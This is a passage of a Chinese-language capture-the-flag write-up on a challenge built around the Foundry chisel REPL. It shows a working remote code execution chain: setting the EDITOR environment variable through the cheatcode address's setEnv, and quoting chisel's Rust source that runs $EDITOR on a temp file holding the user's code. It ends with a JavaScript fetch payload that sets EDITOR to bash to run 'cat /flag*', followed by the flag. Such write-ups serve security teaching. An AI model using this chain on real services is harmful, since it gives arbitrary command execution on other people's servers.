➜ address vm = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
➜ vm.call(abi.encodeWithSignature("setEnv(string,string)", "EDITOR", "Ching367436"));
➜ !e env
PWD=/home
HOME=/root
LC_ALL=en_US.UTF-8
DEBIAN_FRONTEND=noninteractive
TERM=xterm
SHLVL=1
HOSTNAME=25eeccf8b3b2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.foundry/bin
USER=root
RUST_BACKTRACE=1
EDITOR=Ching367436
```

這種 RCE 方式的 argument 會有一個包含目前輸入過的 code 的文字檔的 path。

```rust
ChiselCommand::Edit => {
    // create a temp file with the content of the run code
    let mut temp_file_path = std::env::temp_dir();
    temp_file_path.push("chisel-tmp.sol");
    let result = std::fs::File::create(&temp_file_path)
        .map(|mut file| file.write_all(self.source().run_code.as_bytes()));
    if let Err(e) = result {
        return DispatchResult::CommandFailed(format!(
            "Could not write to a temporary file: {e}"
        ))
    }

    // open the temp file with the editor
    let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vim".to_string());
    let mut cmd = Command::new(editor);
    cmd.arg(&temp_file_path);
    // [...]
}
```

所以可以使用下方這個 payload 在當事網頁跑就會出現 flag。

```javascript
fetch("run?code="+encodeURIComponent`
//;cat /flag*
address vm = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
vm.call(abi.encodeWithSignature("setEnv(string,string)", "EDITOR", "bash"));
!edit
`).then(e=>e.json()).then(e=>location.hash=e.uuid)

// blaz{m1na_b4k3_y0ur_pizza}
```

